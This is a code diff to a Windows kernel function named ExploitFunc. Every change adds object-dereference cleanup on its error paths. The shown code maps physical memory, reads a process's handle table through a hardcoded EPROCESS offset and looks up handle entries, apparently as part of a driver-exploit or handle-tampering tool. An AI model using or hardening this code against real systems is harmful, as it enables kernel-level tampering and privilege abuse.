@@ -90,6 +90,8 @@ void __stdcall ExploitFunc(fnMmGetSystemRoutineAddress MmGetSystemRoutineAddress
 			
 			if (!v12 || !v13 || !PhysAddress.QuadPart)
 			{
+				if (Process != NULL)
+					g_pKernelFuncs->ObDereferenceObject(Process);
 				Data->Success = false;
 				return;
 			}
@@ -97,6 +99,8 @@ void __stdcall ExploitFunc(fnMmGetSystemRoutineAddress MmGetSystemRoutineAddress
 			PVOID v17 = g_pKernelFuncs->MmMapIoSpace(PhysAddress, v12, MEMORY_CACHING_TYPE::MmNonCached);	// Map the physical address to a virtual address
 			if (!v17)
 			{
+				if (Process != NULL)
+					g_pKernelFuncs->ObDereferenceObject(Process);
 				Data->Success = false;
 				return;
 			}
@@ -143,6 +147,8 @@ void __stdcall ExploitFunc(fnMmGetSystemRoutineAddress MmGetSystemRoutineAddress
 			Status = g_pKernelFuncs->PsLookupProcessByProcessId(Data->ProcessId, &Process);
 			if (!NT_SUCCESS(Status))
 			{
+				if (Process != NULL)
+					g_pKernelFuncs->ObDereferenceObject(Process);
 				Data->Success = false;
 				return;
 			}
@@ -150,6 +156,8 @@ void __stdcall ExploitFunc(fnMmGetSystemRoutineAddress MmGetSystemRoutineAddress
 			uint64_t pObjectTable = *(uint64_t*)((uint64_t)Process + 0x418);		// Get PHANDLE_TABLE from EPROCESS struct
 			if (!pObjectTable)
 			{
+				if (Process != NULL)
+					g_pKernelFuncs->ObDereferenceObject(Process);
 				Data->Success = false;
 				return;
 			}
@@ -157,6 +165,8 @@ void __stdcall ExploitFunc(fnMmGetSystemRoutineAddress MmGetSystemRoutineAddress
 			PHANDLE_TABLE_ENTRY entry = ExpLookupHandleTableEntry((PVOID)pObjectTable, (uint64_t)Data->Handle);	// Look up the HANDLE_ENTRY
 			if (!entry)
 			{
+				if (Process != NULL)
+					g_pKernelFuncs->ObDereferenceObject(Process);
 				Data->Success = false;
 				return;
 			}
